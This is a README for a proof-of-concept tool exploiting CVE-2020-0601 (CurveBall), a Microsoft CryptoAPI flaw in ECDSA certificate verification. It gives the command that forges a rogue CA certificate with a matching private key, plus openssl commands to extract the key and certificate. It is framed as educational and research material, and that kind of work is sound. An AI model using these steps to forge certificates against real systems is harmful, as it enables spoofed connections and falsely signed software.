# CurveBall (CVE-2020-0601) - PoC
CVE-2020-0601: Also known as CurveBall or ChainOffFools, is a vulnerability in the Microsoft CryptoApi where elliptic curve signatures (ECDSA) of certificates is not correctly verified. 

There is a very nice blog post [here](https://research.kudelskisecurity.com/2020/01/15/cve-2020-0601-the-chainoffools-attack-explained-with-poc/) which explains the issue very neatly.

*This should only be used for educational and researching purposes!*

## How to

Provide the console application with the path to an elliptic curve certificate.
```
CurveBall.exe 'PathToCA.cer'
```
The program will output a .p12 file contaning a certificate with the same public key and serial number as the original, including a key.

To extract key and cert can be extracted from the .p12 by using openssl with the following commands
```
openssl pkcs12 -in Rogue.p12 -nocerts -out CA.key
```
and 
```
openssl pkcs12 -in Rogue.p12 -clcerts -nokeys -out CA.cer
```
NOTE: Default password is 'Test1234'.
